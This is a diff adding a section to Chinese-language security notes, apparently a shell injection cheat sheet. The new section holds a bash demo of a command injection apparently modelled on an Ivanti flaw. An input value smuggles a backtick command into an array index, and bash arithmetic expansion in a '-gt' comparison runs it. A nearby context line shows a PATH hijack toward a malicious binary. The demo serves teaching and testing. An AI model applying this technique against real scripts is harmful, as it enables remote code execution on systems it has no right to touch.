@@ -528,6 +528,46 @@ export PATH=/path/to/malicious/binary:$PATH
 echo $1>a.sh
 ```
 
+#### 比较操作 命令注入
+
+* 适用于`/bin/bash`
+
+```shell
+#!/bin/bash
+
+# 模拟系统预设的变量
+gPath="some_internal_value"
+kValidLength=10
+
+echo "--- 模拟 Ivanti 命令注入漏洞 ---"
+
+# 1. 模拟从 URL 参数中提取数据
+# 攻击者通过 st 传入变量名 "theValue"
+# 攻击者通过 h 传入包含命令的数组形式 "gPath[`touch RCE_SUCCESS`]"
+input_st="theValue"
+input_h="gPath[\`touch RCE_SUCCESS\`]"
+
+# 2. 模拟脚本内部的赋值逻辑
+# 在循环解析参数时，theValue 会被反复覆盖
+theValue=$input_h
+gStartTime=$input_st
+
+echo "[+] 当前 gStartTime 的值: $gStartTime"
+echo "[+] 当前 theValue 的值: $theValue"
+
+# 3. 触发漏洞的关键点
+# 这里的 -gt (greater than) 会强制进入“算术扩展”模式
+# Bash 会尝试解析 $gStartTime 指向的内容
+echo "[!] 正在执行数值比较..."
+
+if [[ 1600000000 -gt ${gStartTime} ]]; then
+    echo "比较完成。"
+fi
+
+echo "[*] 检查当前目录是否生成了 RCE_SUCCESS 文件："
+ls -l RCE_SUCCESS 2>/dev/null || echo "文件未生成"
+```
+
 
 
 ### 工具
